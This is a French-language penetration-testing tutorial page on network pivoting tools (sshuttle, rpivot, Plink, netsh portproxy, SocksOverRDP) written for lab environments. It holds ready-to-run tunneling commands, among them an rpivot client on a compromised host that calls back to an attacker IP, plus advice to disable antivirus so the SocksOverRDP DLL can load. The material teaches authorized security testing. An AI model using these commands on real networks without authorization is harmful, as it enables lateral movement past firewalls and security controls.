# Outils de pivoting complementaires

Au-dela de SSH et Meterpreter, plusieurs outils specialises facilitent le pivoting dans des contextes specifiques : sshuttle automatise le routage via SSH sans proxychains, rpivot cree un proxy SOCKS inverse, Plink apporte le tunneling SSH sur Windows, netsh permet le port forwarding natif sur Windows, et SocksOverRDP cree un tunnel SOCKS via une connexion RDP.

## Pourquoi

Chaque outil repond a un contexte particulier. Sshuttle est ideal quand on veut scanner sans proxychains. Plink est la seule option quand on pivote depuis un Windows sans OpenSSH. Netsh est disponible nativement sur tous les Windows sans aucune installation. Rpivot fonctionne quand le pivot ne peut pas initier de connexion sortante SSH. SocksOverRDP est la solution quand on est confine dans un environnement Windows pur avec uniquement du RDP.

## Comment ca marche

### Sshuttle

Sshuttle cree un VPN transparent via SSH. Il configure automatiquement les regles iptables pour router le trafic vers le reseau cible, sans avoir besoin de proxychains.

```bash
# - Installer sshuttle
sudo apt-get install sshuttle

# - Pivoter vers le reseau interne via le pivot SSH
sudo sshuttle -r user@<IP_PIVOT> 172.16.5.0/23 -v
```

Apres execution, tous les outils fonctionnent directement sans proxy :

```bash
# - Nmap sans proxychains
nmap -sT -Pn 172.16.5.19 -p 3389

# - RDP sans proxychains
xfreerdp /v:172.16.5.19 /u:user /p:password
```

{% hint style="success" %}
Sshuttle est l'option la plus simple pour le pivoting SSH. Il supprime le besoin de proxychains et permet d'utiliser tous les outils nativement. Son seul inconvenient : il ne fonctionne qu'avec SSH et necessite les privileges root sur la machine d'attaque (pour modifier iptables).
{% endhint %}

### Rpivot

Rpivot est un proxy SOCKS inverse ecrit en Python. Le serveur tourne sur notre machine d'attaque, le client sur le pivot host. Utile quand le pivot peut initier des connexions sortantes mais que le firewall bloque les connexions entrantes.

```bash
# - Sur notre machine (serveur)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# - Transferer rpivot sur le pivot
scp -r rpivot user@<IP_PIVOT>:/tmp/

# - Sur le pivot (client)
python2.7 client.py --server-ip <IP_ATTAQUANT> --server-port 9999
```

Le proxy SOCKS ecoute sur notre machine locale (port 9050). Configurer proxychains et utiliser normalement :

```bash
proxychains curl http://172.16.5.135:80
```

Rpivot supporte aussi l'authentification NTLM via un proxy HTTP d'entreprise :

```bash
python client.py --server-ip <IP> --server-port 8080 \
    --ntlm-proxy-ip <IP_PROXY> --ntlm-proxy-port 8081 \
    --domain CORP --username user --password pass
```

### Plink (SSH pour Windows)

Plink est le client SSH en ligne de commande de PuTTY. Il permet le meme type de tunneling que SSH sur les systemes Windows ou OpenSSH n'est pas installe.

```bash
# - Dynamic port forwarding depuis un pivot Windows
plink -ssh -D 9050 user@<IP_PIVOT>
```

Sur Windows, utiliser Proxifier au lieu de proxychains pour configurer le proxy SOCKS (127.0.0.1:9050) et router le trafic des applications desktop a travers le tunnel.

{% hint style="info" %}
Plink est souvent deja present sur les postes Windows d'administration (installe avec PuTTY). En pentest, c'est un cas classique de "living off the land" : utiliser les outils deja presents pour ne pas deployer de binaires supplementaires.
{% endhint %}

### Netsh (port forwarding natif Windows)

Netsh est un outil natif de Windows qui permet de creer des regles de port forwarding sans aucun logiciel tiers.

```cmd
# - Rediriger le port 8080 vers le RDP d'un hote interne
netsh.exe interface portproxy add v4tov4 \
    listenport=8080 listenaddress=<IP_PIVOT> \
    connectport=3389 connectaddress=172.16.5.25

# - Verifier la regle
netsh.exe interface portproxy show v4tov4
```

Depuis notre machine d'attaque, on se connecte au port 8080 du pivot Windows :

```bash
xfreerdp /v:<IP_PIVOT>:8080 /u:user /p:password
```

{% hint style="warning" %}
Les regles netsh persistent apres un redemarrage. Penser a les supprimer apres le pentest avec `netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=<IP>`.
{% endhint %}

### SocksOverRDP

SocksOverRDP utilise les canaux virtuels dynamiques (DVC) du protocole RDP pour creer un tunnel SOCKS. C'est la solution quand on est dans un environnement Windows pur sans acces SSH.

**Workflow :**

1. Charger le plugin sur le pivot Windows :
```powershell
regsvr32.exe SocksOverRDP-Plugin.dll
```

2. Se connecter en RDP vers l'hote interne (`mstsc.exe` vers 172.16.5.19). Le plugin cree un listener SOCKS sur 127.0.0.1:1080

3. Demarrer le serveur SocksOverRDP sur l'hote interne :
```powershell
SocksOverRDP-Server.exe
```

4. Configurer Proxifier sur le pivot pour utiliser 127.0.0.1:1080 comme proxy SOCKS5

5. Se connecter a des hotes encore plus profonds via `mstsc.exe` a travers le proxy

{% hint style="info" %}
Pour les performances RDP a travers plusieurs sauts, configurer la connexion en mode "Modem" (onglet Experience dans mstsc.exe). Les animations et le lissage des polices consomment de la bande passante inutilement.
{% endhint %}

## En pratique

```bash
# Sshuttle (le plus simple)
sudo sshuttle -r user@<IP_PIVOT> 172.16.5.0/23 -v
nmap -sT -Pn 172.16.5.19

# Rpivot (quand le firewall bloque les connexions entrantes)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# Sur le pivot : python2.7 client.py --server-ip <IP> --server-port 9999
proxychains curl http://172.16.5.135

# Plink (pivot Windows)
plink -ssh -D 9050 user@<IP>

# Netsh (port forwarding natif Windows)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<IP> connectport=3389 connectaddress=172.16.5.25
```

## Pieges et galeres

{% tabs %}
{% tab title="Sshuttle" %}
- **Privileges root requis** : sshuttle modifie iptables, il doit tourner en root sur la machine d'attaque
- **TCP uniquement** : comme proxychains, sshuttle ne route que le TCP. Les scans UDP et ICMP ne passent pas
- **Conflit avec le VPN** : sshuttle peut entrer en conflit avec les regles iptables du VPN HTB. Specifier les sous-reseaux avec precision
{% endtab %}
{% tab title="Windows" %}
- **Plink interactif** : la premiere connexion Plink demande d'accepter la cle SSH de maniere interactive. En pentest, preparer la commande avec `echo y | plink ...`
- **Netsh et firewall** : la regle netsh portproxy ne desactive pas le firewall Windows. Il faut aussi autoriser le port d'ecoute dans le firewall
- **SocksOverRDP et antivirus** : la DLL SocksOverRDP peut etre detectee par l'antivirus. Desactiver temporairement la protection en temps reel si necessaire (en environnement de lab)
{% endtab %}
{% endtabs %}

## Retour terrain

En pratique, le choix de l'outil depend du contexte :

- **Pivot Linux avec SSH** : sshuttle est le premier choix pour sa simplicite
- **Pivot Windows avec PuTTY** : Plink pour le tunneling SSH
- **Pivot Windows sans rien** : netsh pour le port forwarding natif
- **Environnement RDP pur** : SocksOverRDP est la seule option
- **Firewall restrictif** : rpivot pour le proxy SOCKS inverse

Sshuttle est souvent l'outil le plus apprecie en pentest. Il transforme un simple acces SSH en VPN complet en une seule commande, sans configuration de proxychains ni modification de la commande de chaque outil.

## Memo express

| Outil | Plateforme | Prerequis | Usage principal |
|---|---|---|---|
| Sshuttle | Linux (attaquant) | SSH + root local | VPN transparent via SSH |
| Rpivot | Cross-platform | Python 2.7 | Proxy SOCKS inverse |
| Plink | Windows | PuTTY installe | Tunneling SSH sur Windows |
| Netsh | Windows | Natif | Port forwarding simple |
| SocksOverRDP | Windows | Binaires + RDP | Tunnel SOCKS via RDP |
| Proxifier | Windows | Application tierce | Proxy SOCKS pour apps desktop |

***
